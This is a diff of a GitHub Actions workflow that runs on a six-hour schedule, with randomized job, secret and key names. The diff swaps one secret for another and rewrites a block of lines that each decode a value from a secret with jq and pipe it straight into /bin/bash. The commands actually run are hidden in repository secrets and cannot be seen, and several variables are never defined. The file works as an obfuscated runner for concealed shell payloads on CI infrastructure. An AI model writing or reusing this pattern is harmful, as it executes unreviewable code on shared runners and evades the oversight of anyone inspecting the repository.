@@ -2,31 +2,20 @@ name: liaifangxin1985
 on:
   workflow_dispatch:
   schedule:
-    - cron: '33 3/6 * * *'
+    - cron: '24 3/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: liaifangxin1985
         env:
-          mgab70258: ${{ secrets.mgab70258 }}
+          gxq6712: ${{ secrets.gxq6712 }}
         run: |
-          echo $mgab70258 | jq -r .sxd60138 | /bin/bash
-          echo $elc47 | jq -r .oijb95273 | /bin/bash
-          echo $ua49 | jq -r .oo25126 | /bin/bash
-          echo $xdeh2 | jq -r .qvjx32620 | /bin/bash
-          echo $iegev3711 | jq -r .z956 | /bin/bash
-          echo $dt8 | jq -r .r360 | /bin/bash
-          echo $qzbf30653 | jq -r .vnx00480 | /bin/bash
-          echo $lbw5619 | jq -r .f624 | /bin/bash
-          echo $gio5905 | jq -r .hpuo5 | /bin/bash
-          echo $pqu97 | jq -r .ato3987 | /bin/bash
-          echo $ru4325 | jq -r .wuvl5 | /bin/bash
-          echo $uyro2877 | jq -r .qou15922 | /bin/bash
-          echo $bg606 | jq -r .kyn954 | /bin/bash
-          echo $gb5 | jq -r .twb7971 | /bin/bash
-          echo $nh00 | jq -r .bwvk2 | /bin/bash
-          echo $ewdo317 | jq -r .sjtlf1 | /bin/bash
+          echo $gxq6712 | jq -r .wvtgy618 | /bin/bash
+          echo $o211 | jq -r .he54 | /bin/bash
+          echo $y52427 | jq -r .x88 | /bin/bash
+          echo $uhdq990 | jq -r .oun236 | /bin/bash
+          echo $fwp317 | jq -r .gqrzc2540 | /bin/bash
+          echo $alk48 | jq -r .vpiy91377 | /bin/bash
 
